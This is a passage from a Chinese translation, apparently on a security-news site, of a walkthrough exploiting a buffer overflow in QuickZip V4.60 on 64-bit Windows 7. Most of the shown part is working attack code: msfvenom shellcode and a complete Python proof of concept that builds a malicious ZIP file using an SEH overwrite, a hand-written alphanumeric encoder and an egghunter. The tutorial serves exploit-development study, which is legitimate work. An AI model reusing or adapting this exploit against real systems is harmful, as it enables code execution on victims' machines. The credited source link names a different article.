微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在，我们只需安装常规流程来处理一下shellcode就行了——我们需要找出坏字符，然后在shellcode之前插入一个“egg”（w00tw00t）并对齐堆栈。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我不会详细介绍寻找坏字符的细枝末节，因为我已经在这里详细介绍过了。 幸运的是，对于我们来说，这部分有效负载中仅有的坏字符是\ x00，\ x0a和\ x0d。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们还需要在shellcode的开头插入w00tw00t字符，以确保egghunter可以定位它，并将执行权重定向到“egg”之后的第一个指令。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后，我们需要对齐堆栈，以确保ESP指向一个16字节倍数的地址。 这样做的原因是有一些“SIMD”（单指令，多数据）指令可以并行处理内存中的多个字，所以要求这些字的起始地址是16字节的倍数。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果我们没有正确对齐堆栈，那么shellcode根本不起作用。 我们可以轻松地利用单个指令AND esp，0xFFFFFFF0来对齐堆栈，也就是让它正好在w00tw00t“蛋”之后，在实际shellcode之前。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">对于这个概念验证来说，我们将使用msfvenom生成一个简单的、弹出计算器的shellcode，具体如下所示：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">shellcode&nbsp;=&nbsp;&quot;w00tw00t&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;egg
+shellcode&nbsp;+=&nbsp;&quot;\x81\xe4\xf0\xff\xff\xff&quot;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;align&nbsp;the&nbsp;stack:&nbsp;AND&nbsp;esp,0xFFFFFFF0
+#&nbsp;msfvenom&nbsp;-p&nbsp;windows/exec&nbsp;CMD=calc.exe&nbsp;-b&nbsp;&#39;\x00\x0a\x0d&#39;
+#&nbsp;[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;227&nbsp;(iteration=1)
+shellcode&nbsp;+=&nbsp;(&quot;\xbf\xdc\xae\x26\x3d\xda\xdd\xd9\x74\x24\xf4\x5b\x31\xc9&quot;
+&quot;\xb1\x33\x31\x7b\x12\x03\x7b\x12\x83\x37\x52\xc4\xc8\x3b&quot;
+&quot;\x43\x80\x33\xc3\x94\xf3\xba\x26\xa5\x21\xd8\x23\x94\xf5&quot;
+&quot;\xaa\x61\x15\x7d\xfe\x91\xae\xf3\xd7\x96\x07\xb9\x01\x99&quot;
+&quot;\x98\x0f\x8e\x75\x5a\x11\x72\x87\x8f\xf1\x4b\x48\xc2\xf0&quot;
+&quot;\x8c\xb4\x2d\xa0\x45\xb3\x9c\x55\xe1\x81\x1c\x57\x25\x8e&quot;
+&quot;\x1d\x2f\x40\x50\xe9\x85\x4b\x80\x42\x91\x04\x38\xe8\xfd&quot;
+&quot;\xb4\x39\x3d\x1e\x88\x70\x4a\xd5\x7a\x83\x9a\x27\x82\xb2&quot;
+&quot;\xe2\xe4\xbd\x7b\xef\xf5\xfa\xbb\x10\x80\xf0\xb8\xad\x93&quot;
+&quot;\xc2\xc3\x69\x11\xd7\x63\xf9\x81\x33\x92\x2e\x57\xb7\x98&quot;
+&quot;\x9b\x13\x9f\xbc\x1a\xf7\xab\xb8\x97\xf6\x7b\x49\xe3\xdc&quot;
+&quot;\x5f\x12\xb7\x7d\xf9\xfe\x16\x81\x19\xa6\xc7\x27\x51\x44&quot;
+&quot;\x13\x51\x38\x02\xe2\xd3\x46\x6b\xe4\xeb\x48\xdb\x8d\xda&quot;
+&quot;\xc3\xb4\xca\xe2\x01\xf1\x25\xa9\x08\x53\xae\x74\xd9\xe6&quot;
+&quot;\xb3\x86\x37\x24\xca\x04\xb2\xd4\x29\x14\xb7\xd1\x76\x92&quot;
+&quot;\x2b\xab\xe7\x77\x4c\x18\x07\x52\x2f\xff\x9b\x3e\x9e\x9a&quot;
+&quot;\x1b\xa4\xde&quot;)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">而涵盖迄今所讨论的所有内容的PoC代码如下所示：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#!/usr/bin/python
+header_1&nbsp;=&nbsp;(&quot;\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00&quot;
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00&quot;)
+header_2&nbsp;=&nbsp;(&quot;\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00&quot;
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00&quot;
+&quot;\x24\x00\x00\x00\x00\x00\x00\x00&quot;)
+header_3&nbsp;=&nbsp;(&quot;\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00&quot;
+&quot;\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00&quot;)
+print&nbsp;&quot;[+]&nbsp;Building&nbsp;PoC..&quot;
+max_size&nbsp;=&nbsp;4064
+nseh_offset&nbsp;=&nbsp;292
+jump_offset&nbsp;=&nbsp;92
+#&nbsp;msfencode&nbsp;-e&nbsp;x86/alpha_mixed&nbsp;bufferregister=eax&nbsp;-i&nbsp;egghunter-wow64.bin
+#&nbsp;[*]&nbsp;x86/alpha_mixed&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;146&nbsp;(iteration=1)
+egghunter&nbsp;=&nbsp;(&quot;\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49&quot;
+&quot;\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30&quot;
+&quot;\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42&quot;
+&quot;\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x66\x51\x49\x4b&quot;
+&quot;\x52\x73\x53\x63\x62\x73\x36\x33\x4e\x53\x6f\x30\x75\x36&quot;
+&quot;\x6d\x51\x59\x5a\x49\x6f\x36\x6f\x72\x62\x71\x42\x42\x4a&quot;
+&quot;\x66\x46\x56\x38\x74\x73\x78\x49\x4c\x4b\x4b\x64\x61\x74&quot;
+&quot;\x49\x6f\x47\x63\x31\x4e\x50\x5a\x77\x4c\x77\x75\x53\x44&quot;
+&quot;\x49\x79\x38\x38\x52\x57\x36\x50\x50\x30\x33\x44\x6c\x4b&quot;
+&quot;\x59\x6a\x4e\x4f\x32\x55\x38\x64\x4e\x4f\x70\x75\x6b\x51&quot;
+&quot;\x6b\x4f\x79\x77\x41\x41&quot;)
+payload&nbsp;=&nbsp;egghunter
+payload&nbsp;+=&nbsp;&quot;A&quot;&nbsp;*&nbsp;(nseh_offset&nbsp;-&nbsp;len(payload)&nbsp;-&nbsp;jump_offset)&nbsp;#&nbsp;padding&nbsp;for&nbsp;nSEH
+payload&nbsp;+=&nbsp;&quot;\x41\x41&quot;&nbsp;&nbsp;&nbsp;#&nbsp;INC&nbsp;ECX&nbsp;(acts&nbsp;as&nbsp;NOPs,&nbsp;but&nbsp;with&nbsp;valid&nbsp;character&nbsp;set)
+#&nbsp;Offset&nbsp;the&nbsp;stack&nbsp;by&nbsp;0x632&nbsp;to&nbsp;start&nbsp;writing&nbsp;to&nbsp;a&nbsp;controlled&nbsp;area&nbsp;of&nbsp;memory
+#
+payload&nbsp;+=&nbsp;&quot;\x54&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;esp;
+payload&nbsp;+=&nbsp;&quot;\x58&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pop&nbsp;eax;
+payload&nbsp;+=&nbsp;&quot;\x05\x33\x07\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x01010733
+payload&nbsp;+=&nbsp;&quot;\x2d\x01\x01\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;sub&nbsp;eax,&nbsp;0x01010101
+payload&nbsp;+=&nbsp;&quot;\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;eax;
+payload&nbsp;+=&nbsp;&quot;\x5c&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pop&nbsp;esp;
+#&nbsp;Write&nbsp;instructions&nbsp;for:&nbsp;push&nbsp;esp;&nbsp;pop&nbsp;eax;&nbsp;sub&nbsp;eax,&nbsp;0xBE;&nbsp;jmp&nbsp;eax;&nbsp;jmp&nbsp;0xee
+#
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Zero-out&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x25\x01\x01\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x01010101
+payload&nbsp;+=&nbsp;&quot;\x25\x10\x10\x10\x10&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x10101010
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;write&nbsp;0xeceb90e0&nbsp;into&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x05\x70\x70\x77\x77&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x77777070
+payload&nbsp;+=&nbsp;&quot;\x05\x70\x20\x74\x77&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x77742070
+payload&nbsp;+=&nbsp;&quot;\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;eax;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Zero-out&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x25\x01\x01\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x01010101
+payload&nbsp;+=&nbsp;&quot;\x25\x10\x10\x10\x10&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x10101010
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;write&nbsp;0xff000000&nbsp;into&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x05\x01\x01\x01\x77&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x77010101
+payload&nbsp;+=&nbsp;&quot;\x05\x01\x01\x01\x77&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x77010101
+payload&nbsp;+=&nbsp;&quot;\x05\x10\x10\x10\x22&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x22101010
+payload&nbsp;+=&nbsp;&quot;\x2d\x12\x12\x12\x11&quot;&nbsp;&nbsp;&nbsp;#&nbsp;sub&nbsp;eax,&nbsp;0x11121212
+payload&nbsp;+=&nbsp;&quot;\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;eax;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Zero-out&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x25\x01\x01\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x01010101
+payload&nbsp;+=&nbsp;&quot;\x25\x10\x10\x10\x10&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x10101010
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;write&nbsp;0xbe2d5854&nbsp;into&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x05\x43\x47\x1c\x67&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x671c4743
+payload&nbsp;+=&nbsp;&quot;\x05\x11\x11\x11\x57&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x57111111
+payload&nbsp;+=&nbsp;&quot;\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;eax;
+payload&nbsp;+=&nbsp;&quot;A&quot;&nbsp;*&nbsp;(nseh_offset&nbsp;-&nbsp;len(payload))&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;padding&nbsp;for&nbsp;the&nbsp;rest&nbsp;of&nbsp;encoder
+payload&nbsp;+=&nbsp;&quot;\x71\x9b\x70\x9b&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;nSEH:&nbsp;jno&nbsp;$-99;&nbsp;jo&nbsp;$-99&nbsp;&nbsp;&nbsp;=&gt;&nbsp;&#39;9b&#39;&nbsp;will&nbsp;actually&nbsp;be&nbsp;converted&nbsp;to&nbsp;&#39;a2&#39;,&nbsp;which&nbsp;is&nbsp;$-92
+payload&nbsp;+=&nbsp;&quot;\x33\x28\x42\x00&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;SEH
+shellcode&nbsp;=&nbsp;&quot;w00tw00t&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;egg
+shellcode&nbsp;+=&nbsp;&quot;\x81\xe4\xf0\xff\xff\xff&quot;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;align&nbsp;the&nbsp;stack:&nbsp;AND&nbsp;esp,0xFFFFFFF0
+#&nbsp;msfvenom&nbsp;-p&nbsp;windows/exec&nbsp;CMD=calc.exe&nbsp;-b&nbsp;&#39;\x00\x0a\x0d&#39;
+#&nbsp;[*]&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;227&nbsp;(iteration=1)
+shellcode&nbsp;+=&nbsp;(&quot;\xbf\xdc\xae\x26\x3d\xda\xdd\xd9\x74\x24\xf4\x5b\x31\xc9&quot;
+&quot;\xb1\x33\x31\x7b\x12\x03\x7b\x12\x83\x37\x52\xc4\xc8\x3b&quot;
+&quot;\x43\x80\x33\xc3\x94\xf3\xba\x26\xa5\x21\xd8\x23\x94\xf5&quot;
+&quot;\xaa\x61\x15\x7d\xfe\x91\xae\xf3\xd7\x96\x07\xb9\x01\x99&quot;
+&quot;\x98\x0f\x8e\x75\x5a\x11\x72\x87\x8f\xf1\x4b\x48\xc2\xf0&quot;
+&quot;\x8c\xb4\x2d\xa0\x45\xb3\x9c\x55\xe1\x81\x1c\x57\x25\x8e&quot;
+&quot;\x1d\x2f\x40\x50\xe9\x85\x4b\x80\x42\x91\x04\x38\xe8\xfd&quot;
+&quot;\xb4\x39\x3d\x1e\x88\x70\x4a\xd5\x7a\x83\x9a\x27\x82\xb2&quot;
+&quot;\xe2\xe4\xbd\x7b\xef\xf5\xfa\xbb\x10\x80\xf0\xb8\xad\x93&quot;
+&quot;\xc2\xc3\x69\x11\xd7\x63\xf9\x81\x33\x92\x2e\x57\xb7\x98&quot;
+&quot;\x9b\x13\x9f\xbc\x1a\xf7\xab\xb8\x97\xf6\x7b\x49\xe3\xdc&quot;
+&quot;\x5f\x12\xb7\x7d\xf9\xfe\x16\x81\x19\xa6\xc7\x27\x51\x44&quot;
+&quot;\x13\x51\x38\x02\xe2\xd3\x46\x6b\xe4\xeb\x48\xdb\x8d\xda&quot;
+&quot;\xc3\xb4\xca\xe2\x01\xf1\x25\xa9\x08\x53\xae\x74\xd9\xe6&quot;
+&quot;\xb3\x86\x37\x24\xca\x04\xb2\xd4\x29\x14\xb7\xd1\x76\x92&quot;
+&quot;\x2b\xab\xe7\x77\x4c\x18\x07\x52\x2f\xff\x9b\x3e\x9e\x9a&quot;
+&quot;\x1b\xa4\xde&quot;)
+payload&nbsp;+=&nbsp;shellcode
+payload&nbsp;+=&nbsp;&quot;A&quot;&nbsp;*&nbsp;(max_size&nbsp;-&nbsp;len(payload))&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;padding
+payload&nbsp;+=&nbsp;&quot;.txt&quot;
+print&nbsp;&quot;[+]&nbsp;Length&nbsp;=&nbsp;&quot;&nbsp;+&nbsp;str(len(payload))
+exploit&nbsp;=&nbsp;header_1&nbsp;+&nbsp;payload&nbsp;+&nbsp;header_2&nbsp;+&nbsp;payload&nbsp;+&nbsp;header_3&nbsp;+&nbsp;payload
+mefile&nbsp;=&nbsp;open(&#39;cst.zip&#39;,&#39;w&#39;);
+mefile.write(exploit);
+mefile.close()
+print&nbsp;&quot;[+]&nbsp;Exploit&nbsp;complete!&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">当我们打开生成的cst.zip文件时，我们的漏洞利用代码就会运行，几秒钟（因为egghunter通过应用程序的内存找到“蛋”）后，我们应该看到计算器被打开。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t014833ab6c59c64db9.png" title="t014833ab6c59c64db9.png" alt="http://p4.qhimg.com/t014833ab6c59c64db9.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">成功了！！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">小结</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在本文中，我们已经成功地重新创建了QuickZip漏洞利用代码的64位版本，它已经可以在Windows 7上运行了！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">总而言之，我们通过使用非常有限的、被允许的字符集（几乎可以ASCII打印）创建了一个egghunter漏洞利用代码，编写了我们自己的编码器，并通过在内存中的跳转，到达egghunter代码，最终到达shellcode。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">需要注意的是：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">找出允许使用的字符，并在发生错误时记住这些字符</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果缓冲区大小不够，不要气馁——发挥你的创造性！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">确保您使用正确的egghunter代码（32位与64位），具体取决于您正在开发漏洞的平台</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">编写自己的编码器不是那么难，但需要大量的练习和耐心</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">确保在执行shellcode之前对齐堆栈&nbsp;</span></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="http://blog.knapsy.com/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/" target="_blank">原文链接：http://blog.knapsy.com/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】QuickZip V4.60 缓冲区溢出漏洞详解 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3839" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/0x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="2645193558" class="response" data-bind-id="2645193558" data-target="13964" user-name="dllall" href="javascript:;">
+                dllall            </a>
+                        <span class="comment-time">2017-05-11 12:25:49</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="2645193558" data-target="13964">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13964" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">mark</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/9x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="13953" user-name="Anonymous" href="javascript:;">
+                Anonymous            </a>
+                        <span class="comment-time">2017-05-11 10:45:06</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="13953">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13953" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">Good! Thanks~</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+
+        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3839" data-page="2">查看更多</a>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
